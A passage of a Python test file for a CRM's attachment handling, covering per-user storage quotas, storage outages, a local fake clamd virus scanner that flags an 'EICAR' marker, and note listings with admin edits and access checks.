    assert [e.id for e in storage.check_allowed_extensions()] == ["arkray.E023"]
    settings.ATTACHMENT_MAX_BYTES_PER_USER = 0  # no quota: allowed
    assert storage.check_allowed_extensions() == []


class TestStorageQuota:
    """Deep security audit L-7: one person's files can take at most
    ATTACHMENT_MAX_BYTES_PER_USER of storage (the race: tests/integration/
    test_attachment_quota_races.py)."""

    def test_a_file_that_would_go_over_is_refused(self, user_a_client, note, settings):
        settings.ATTACHMENT_MAX_BYTES_PER_USER = 10
        assert upload(user_a_client, note, "a.txt", b"x" * 6).status_code == 201
        response = upload(user_a_client, note, "b.txt", b"x" * 5)
        assert response.status_code == 422, response.content
        error = response.json()["error"]
        assert error["code"] == "attachment_quota_exceeded"
        assert "at most 10 bytes" in error["message"]
        assert Attachment.objects.count() == 1
        assert upload(user_a_client, note, "c.txt", b"x" * 4).status_code == 201  # exactly full
        assert attachments.stored_bytes(note.created_by_id) == 10

    def test_deleted_files_count_until_their_object_is_removed(self, user_a_client, note, settings):
        settings.ATTACHMENT_MAX_BYTES_PER_USER = 10
        attachment_id = upload(user_a_client, note, "a.txt", b"x" * 10).json()["id"]
        assert (
            user_a_client.delete(f"/api/v1/workspaces/me/attachments/{attachment_id}").status_code
            == 204
        )
        assert upload(user_a_client, note, "b.txt", b"x").status_code == 422  # still stored
        drain_outbox()  # the purge job removes the object
        assert upload(user_a_client, note, "b.txt", b"x" * 10).status_code == 201

    def test_each_person_has_their_own(self, user_a_client, user_b, user_b_client, note, settings):
        settings.ATTACHMENT_MAX_BYTES_PER_USER = 10
        assert upload(user_a_client, note, "a.txt", b"x" * 10).status_code == 201
        lead = LeadFactory(owner=user_b)
        theirs = NoteFactory(
            lead=lead, opportunity=OpportunityFactory(lead=lead), created_by=user_b
        )
        assert upload(user_b_client, theirs, "b.txt", b"x" * 10).status_code == 201
        assert upload(user_a_client, note, "c.txt", b"x").status_code == 422

    def test_an_administrator_pays_for_what_they_add_to_someones_workspace(
        self, admin, admin_client, user_a, user_a_client, note, settings
    ):
        settings.ATTACHMENT_MAX_BYTES_PER_USER = 10
        assert upload(user_a_client, note, "a.txt", b"x" * 10).status_code == 201
        workspace = str(user_a.pk)
        response = upload(admin_client, note, "b.txt", b"x" * 10, workspace=workspace)
        assert response.status_code == 201, response.content
        assert attachments.stored_bytes(admin.pk) == 10

    def test_zero_means_no_quota(self, user_a_client, note, settings):
        settings.ATTACHMENT_MAX_BYTES_PER_USER = 0
        settings.ATTACHMENT_MAX_BYTES = 1024
        for n in range(3):
            assert upload(user_a_client, note, f"{n}.txt", b"x" * 1024).status_code == 201

    def test_the_default_is_two_gigabytes(self):
        from django.conf import settings as django_settings

        assert django_settings.ATTACHMENT_MAX_BYTES_PER_USER == 2 * 1024**3
        assert "2 GB" in attachments.OVER_QUOTA.format(limit=attachments._human_size(2 * 1024**3))


class TestOutages:
    def test_storage_down_fails_the_upload_cleanly_and_nothing_else(
        self, user_a_client, note, monkeypatch
    ):
        def down(*args, **kwargs):
            raise storage.StorageUnavailable

        monkeypatch.setattr(storage, "save", down)
        response = upload(user_a_client, note, "x.txt", b"x")
        assert response.status_code == 503
        assert response.json()["error"]["code"] == "storage_unavailable"
        assert Attachment.objects.get().state == "failed"
        # the rest of the CRM doesn't depend on file storage
        assert user_a_client.get("/api/v1/workspaces/me/dashboard").status_code == 200
        notes = user_a_client.get(
            f"/api/v1/workspaces/me/opportunities/{note.opportunity_id}/notes"
        )
        assert notes.status_code == 200
        assert notes.json()["results"][0]["attachments"] == []

    def test_storage_down_fails_the_download_with_a_503(self, user_a_client, note, monkeypatch):
        attachment_id = upload(user_a_client, note, "x.txt", b"x").json()["id"]

        def down(*args, **kwargs):
            raise storage.StorageUnavailable

        monkeypatch.setattr(storage, "open_file", down)
        assert download(user_a_client, attachment_id).status_code == 503


class FakeClamd:
    """A minimal clamd INSTREAM peer for tests (the protocol, not a scanner): answers FOUND
    for content containing the EICAR marker, OK otherwise."""

    def __init__(self) -> None:
        self.server = socket.create_server(("127.0.0.1", 0))
        self.port = self.server.getsockname()[1]
        self.thread = threading.Thread(target=self.serve, daemon=True)
        self.thread.start()

    def serve(self) -> None:
        while True:
            try:
                conn, _ = self.server.accept()
            except OSError:
                return
            with conn:
                command = b""
                while not command.endswith(b"\0"):
                    command += conn.recv(1)
                data = b""
                while True:
                    (size,) = struct.unpack("!L", self._exactly(conn, 4))
                    if size == 0:
                        break
                    data += self._exactly(conn, size)
                verdict = (
                    b"stream: Eicar-Test-Signature FOUND\0" if b"EICAR" in data else b"stream: OK\0"
                )
                conn.sendall(verdict)

    @staticmethod
    def _exactly(conn, size):
        out = b""
        while len(out) < size:
            out += conn.recv(size - len(out))
        return out

    def close(self) -> None:
        self.server.close()


@pytest.fixture
def clamd(settings):
    fake = FakeClamd()
    settings.ATTACHMENT_SCANNER = f"clamd://127.0.0.1:{fake.port}"
    yield fake
    fake.close()


class TestScanning:
    def test_pending_until_clean(self, user_a_client, note, clamd):
        created = upload(user_a_client, note, "x.txt", b"fine").json()
        assert (created["scan_status"], created["downloadable"]) == ("pending", False)
        assert download(user_a_client, created["id"]).status_code == 422
        drain_outbox()
        assert Attachment.objects.get(pk=created["id"]).scan_status == "clean"
        assert download(user_a_client, created["id"]).status_code == 200

    def test_malware_is_blocked_and_removed(self, user_a_client, note, clamd):
        created = upload(user_a_client, note, "x.txt", b"EICAR test").json()
        key = Attachment.objects.get(pk=created["id"]).storage_key
        drain_outbox()
        row = Attachment.objects.get(pk=created["id"])
        assert row.scan_status == "rejected"
        response = download(user_a_client, created["id"])
        assert response.status_code == 422
        assert "blocked" in response.json()["error"]["message"]
        assert not storages["attachments"].exists(key)
        assert AuditEvent.objects.filter(action="attachment.rejected").count() == 1

    def test_a_scanner_outage_keeps_the_file_pending(self, user_a_client, note, settings):
        settings.ATTACHMENT_SCANNER = "clamd://127.0.0.1:1"  # nothing listens
        created = upload(user_a_client, note, "x.txt", b"fine").json()
        drain_outbox()
        assert Attachment.objects.get(pk=created["id"]).scan_status == "pending"
        assert download(user_a_client, created["id"]).status_code == 422


class TestNotesList:
    def test_notes_with_files_authors_and_edits(
        self, admin, admin_client, user_a, user_a_client, note
    ):
        upload(user_a_client, note, "photo.png", PNG)
        url = f"/api/v1/workspaces/me/opportunities/{note.opportunity_id}/notes"
        listed = user_a_client.get(url).json()["results"]
        assert len(listed) == 1
        first = listed[0]
        assert first["created_by"]["id"] == str(user_a.pk)
        assert first["can_edit"] is True
        assert first["edited_at"] is None
        assert [a["name"] for a in first["attachments"]] == ["photo.png"]
        # an administrator edits it in Rahul's workspace: shown as their edit
        edited = admin_client.patch(
            f"/api/v1/workspaces/{user_a.pk}/activities/{note.pk}",
            {"version": note.version, "description": "Corrected by admin"},
            format="json",
        )
        assert edited.status_code == 200, edited.content
        again = user_a_client.get(url).json()["results"][0]
        assert again["description"] == "Corrected by admin"
        assert again["edited_by"]["id"] == str(admin.pk)
        assert again["created_by"]["id"] == str(user_a.pk)  # the author stays the author

    def test_another_users_deal_notes_dont_exist(self, user_b, note):
        url = f"/api/v1/workspaces/me/opportunities/{note.opportunity_id}/notes"
        assert signed_in(user_b).get(url).status_code == 404
